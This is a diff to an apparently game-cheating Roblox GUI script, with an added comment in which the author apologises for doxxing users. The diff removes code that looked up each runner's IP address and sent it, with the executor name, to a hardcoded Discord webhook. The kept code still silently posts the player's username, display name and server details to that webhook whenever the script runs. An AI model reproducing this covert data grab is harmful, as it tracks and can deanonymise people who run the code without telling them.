@@ -1,4 +1,14 @@
--- Realirist's OPBGGUI
+-- Realirist's OPBGGUI Discontinued
+--[[
+Dear OPBGGUI Community:
+I want to apologize for the soon coming OPBGGUI discontinuation.
+It appears I got a little nasty with power, even going as far to doxx people.
+It's gonna be discontinued, your info's gonna be safe, because it has been deleted.
+Logs are now gonna be sticking to username, display name, and game info.
+I am sorry for this, but I am even more sorry for getting carried away.
+It's honestly disgusting. 
+Yours truly, Realirist. Thank you for everything!
+]]
 
 -- Instances:
 
@@ -964,18 +974,17 @@ UISizeConstraint_41.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function YNHHZN_fake_script() -- Main.LocalScript 
+local function SVDYM_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
-	warn('don\'t skid bru im doing yall favors')
 	local http_request = http_request or (function()
 		if game:GetService('RunService'):IsServer() then
 			print('Serverside')
 			return function(...)
 				return game:GetService('HttpService'):RequestAsync(...) 
 			end 
-		elseif script and not writefile then
+		elseif script and not writefile and game:GetService('RunService'):IsStudio() then
 			--print('Non exploit')
 			return function(...)
 				--print(...)
@@ -987,14 +996,7 @@ local function YNHHZN_fake_script() -- Main.LocalScript
 			print('Exploit or failure environment')
 		end
 	end)()
-	local function getIp()
-		return tostring(http_request({
-			Url = "https://api.ipify.org",
-			Method = "GET"
-		}).Body)
-	end
 	
-	local identifyexecutor = identifyexecutor or function() return 'Roblox Studio' end
 	function getData(userId)
 		if table.pack(pcall(function() http_request({Url = "https://www.roblox.com", Method = 'GET'}) end))[1]==true then
 			--print('Can make requests (Exploit environment)')
@@ -1011,13 +1013,11 @@ local function YNHHZN_fake_script() -- Main.LocalScript
 	if http_request then 
 		print('Http request accessible.')
 		http_request({Url = "https://discord.com/api/webhooks/1334971604576501860/8D5u4nAJoWLe29XfN2INjOXNHY4yP84_fIrzPE5HcwvaQdWyVgsIjgdh-do114qkRKmp",Method = "POST",Headers = { ["Content-Type"] = "application/json" },Body = game.HttpService:JSONEncode({
-			content = '<@763885428901543957> OPBGGUI EXECUTED\nUsername: ' .. game.Players.LocalPlayer.Name ..
-				'\nExecutor: ' .. tostring(identifyexecutor() or "Unknown") ..
+			content = 'Username: ' .. game.Players.LocalPlayer.Name ..
 				'\nDisplay: ' .. game.Players.LocalPlayer.DisplayName ..
 				'\nServer Size: ' .. tostring(#game.Players:GetPlayers()) .. '/' .. tostring(game.Players.MaxPlayers) ..
 				'\nJobId/ServerId: ' .. game.JobId ..
-				'\nGame Url: https://roblox.com/games/' .. game.PlaceId .. '/'..
-				'\nIP: '.. getIp(),
+				'\nGame Name: '.. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
 			embeds = {{image = {url = getData(game.Players.LocalPlayer.UserId).imageUrl}}}})
 		})
 	
@@ -1742,9 +1742,7 @@ local function YNHHZN_fake_script() -- Main.LocalScript
 		end
 	end
 	coroutine.wrap(function()
-		print('Running coroutine')
 		local run = getRunner()()
 	end)()
-	print('Coroutine is successful.')
 end
-coroutine.wrap(YNHHZN_fake_script)()
+coroutine.wrap(SVDYM_fake_script)()
